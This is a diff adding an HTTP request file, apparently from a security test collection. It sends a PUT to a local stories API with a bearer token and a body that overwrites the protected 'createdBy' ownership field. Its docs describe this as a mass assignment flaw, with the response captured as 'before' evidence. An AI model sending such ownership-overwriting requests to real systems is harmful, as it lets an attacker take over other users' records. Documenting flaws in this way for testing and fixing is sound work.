@@ -1,0 +1,38 @@
+meta {
+  name: 01. BEFORE - Overwrite Ownership via Mass Assignment
+  type: http
+  seq: 1
+}
+
+put {
+  url: http://localhost:5050/api/stories/6ab8c2dc5513d120cf611fa1
+  body: json
+  auth: bearer
+}
+
+headers {
+  Content-Type: application/json
+}
+
+auth:bearer {
+  token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjZhYjc3YjdkNTU0NzM2MWU2NGQwMjQxOSIsImlhdCI6MTc5MDQ5MzE4NSwiZXhwIjoxNzkzMDg1MTg1fQ.sSJGPKrMWnE4UEes9w7BaFmEY86WxRLHyeN9Dpv593M
+}
+
+body:json {
+  {
+    "title": "Tampered Story Title",
+    "createdBy": "000000000000000000000000"
+  }
+}
+
+docs {
+  # VULN-06: Mass Assignment & Missing Field Whitelisting
+  
+  ## Objective:
+  Demonstrate that `updateStory` blindly spreads `...req.body` into `findByIdAndUpdate`, allowing an attacker to overwrite protected ownership fields (`createdBy`).
+  
+  ## How to test:
+  1. Click Send.
+  2. Notice the response returns 200 OK and `createdBy` was successfully overwritten to `"000000000000000000000000"`!
+  3. Capture a screenshot for your BEFORE evidence!
+}
